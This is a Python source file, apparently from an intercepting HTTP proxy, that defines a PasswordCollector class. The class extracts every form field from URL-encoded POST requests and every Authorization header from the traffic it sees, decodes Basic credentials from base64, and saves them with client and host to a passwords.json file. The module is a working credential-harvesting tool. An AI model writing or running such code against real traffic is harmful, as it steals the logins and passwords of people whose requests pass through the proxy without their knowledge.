import json
import logging
from urllib.parse import unquote
from base64 import b64decode
from typing import Optional

from common.filemanager import FileManager
from proxy.httpparser import HTTPRequest


class UserData:
    def __init__(self, data: dict, host=None, client=None):
        self.data = data
        if host:
            self.data['host'] = host
        if client:
            self.data['client'] = client

    def to_dict(self):
        return self.data

    def __hash__(self):
        values = [f'{key}={value}' for key, value in self.data.items()
                  if key != 'client']
        return hash(' '.join(values))

    def __eq__(self, other):
        if not isinstance(other, UserData):
            return False
        if len(other.data) == len(self.data):
            for key, value in self.data.items():
                if key in other.data and other.data[key] == value:
                    continue
                else:
                    return False
            return True
        return False

    def from_dict(self, data: dict) -> 'UserData':
        self.data = data
        return self


class PasswordCollector:
    _form_urlencoded = 'application/x-www-form-urlencoded'
    _logger = logging.getLogger('passwordCollector')

    def __init__(self, dirname: str = './passwords',
                 file: str = 'passwords.json'):
        self._file = FileManager(file=file, dirname=dirname)
        self._users: set[UserData] = set()
        try:
            self._load()
        except json.decoder.JSONDecodeError:
            self._logger.warning(
                f'Ошибка при чтении файла {self._file.filename}')
        if len(self._users) == 0:
            self.dump()

    def _extract_userdata(self, client,
                          data: HTTPRequest) -> Optional[UserData]:
        if data.method == 'POST' and 'content-type' in data.headers \
                and data.headers['content-type'] == self._form_urlencoded:
            return self._url_form(client=client, request=data)
        if 'authorization' in data.headers:
            return self._auth_header(value=data.headers['authorization'],
                                     client=client,
                                     host=data.headers['host'])
        return None

    @staticmethod
    def _url_form(client: str, request: HTTPRequest) -> UserData:
        data = dict()
        for cortege in request.content.decode('utf-8').split('&'):
            key, value = cortege.split('=', maxsplit=1)
            data[unquote(key)] = unquote(value)
        return UserData(data, client=client, host=request.headers['host'])

    @staticmethod
    def _auth_header(value, client, host) -> UserData:
        auth_scheme, parameters = value.split(' ', maxsplit=1)
        if auth_scheme == 'Basic':
            return UserData(
                data={'scheme': 'Basic',
                      'credential': b64decode(parameters).decode()},
                client=client,
                host=host
            )
        else:
            data = dict()
            data['scheme'] = auth_scheme
            for parameter in parameters.split(','):
                key, value = parameter.split('=')
                data[key] = value
            return UserData(data=data, client=client, host=host)

    def add_userdata(self, addr, data: HTTPRequest):
        user = self._extract_userdata(addr, data)
        if user:
            self._users.add(user)
            self.append_to_json(user.to_dict())

    def _load(self):
        self._file.check_exist()
        with open(self._file.filename) as f:
            data = json.load(f)
        self._users = set()
        for userdata in data:
            self._users.add(UserData(userdata))

    def dump(self):
        self._file.check_exist()
        with open(self._file.filename, 'w') as f:
            data = list()
            for user in self._users:
                data.append(user.to_dict())
            f.write(json.dumps(data))

    def append_to_json(self, data):
        """
        :param data: dict to append
        """
        new_ending = json.dumps(data) + ']\n'
        if len(self._users) > 1:
            new_ending = f', {new_ending}'
        self._file.check_exist()
        with open(self._file.filename, 'r+') as f:
            f.seek(0, 2)
            index = f.tell()
            while not f.read().startswith(']'):
                index -= 1
                if index == 0:
                    raise ValueError(
                        f'Can\'t find JSON object in {self._file.filename}')
                f.seek(index)
            f.seek(index)
            f.write(new_ending)
